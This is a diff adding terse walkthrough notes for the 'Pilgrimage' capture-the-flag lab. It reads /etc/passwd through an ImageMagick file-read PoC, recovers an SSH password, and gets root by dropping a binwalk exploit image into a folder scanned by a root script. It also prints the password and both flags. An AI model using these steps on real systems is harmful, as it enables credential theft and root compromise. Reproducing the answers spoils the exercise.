@@ -1,0 +1,58 @@
+The server scan the content of the uploaded files 
+
+use exiftool to put a command injection in the uploaded image 
+
+OR
+
+Via this github : https://github.com/Sybil-Scan/imagemagick-lfi-poc
+
+python3 generate.py -f "/etc/passwd" -o exploit.png
+
+upload exploit.png
+
+wget http://pilgrimage.htb/shrunk/64e4a86c8d26e.png
+
+identify -verbose 64e4a86c8d26e.png
+
+You will find Hexa 
+
+echo -n "HEXA" | xxd -r -p > out 
+
+you will get the users of the system : emily , root
+
+by reading also /var/db/pilgrimage with the same procsess 
+
+you will find password for emily then login via ssh
+
+emily:abigchonkyboi123
+
+user flag : 87aaf041237367203bd91b835c716bc4
+
+find / -type f -user emily 2>/dev/null 
+
+root         767  0.0  0.0   6816  2432 ?        S    15:34   0:00 /bin/bash /usr/sbin/malwarescan.sh
+
+
+emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
+#!/bin/bash
+
+blacklist=("Executable script" "Microsoft executable")
+
+/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
+        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
+        binout="$(/usr/local/bin/binwalk -e "$filename")"
+        for banned in "${blacklist[@]}"; do
+                if [[ "$binout" == *"$banned"* ]]; then
+                        /usr/bin/rm "$filename"
+                        break
+                fi
+        done
+done
+
+the binwalk script is running in the bg with version v2.3.2
+
+upload the binwalk_exploit.png via pyhton server
+
+cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
+
+root flag : 99b5303b8eda7b9a4ad8f25757a16756
